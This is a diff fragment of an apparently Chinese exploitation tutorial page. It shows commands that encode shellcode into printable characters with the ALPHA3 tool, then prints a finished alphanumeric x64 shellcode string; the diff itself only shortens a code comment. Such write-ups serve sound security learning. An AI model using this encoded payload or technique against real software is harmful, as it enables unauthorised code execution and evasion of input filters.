 <h3 id="2-将上述代码保存成sc-py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件"><a href="#2-将上述代码保存成sc-py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件" class="headerlink" title="2.将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件"></a>2.将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sc.py &gt; sc</span><br></pre></td></tr></table></figure>
 
 <p><strong>3.使用alpha3生成string.printable （这里得用 python2）</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;  #这里的参数 rax 是需要填入执行 shellcode 的那个寄存器（call                                                              rax）</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;  #这里的参数 rax 是需要填入执行 shellcode 的那个寄存器</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode=<span class="string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br></pre></td></tr></table></figure>
 
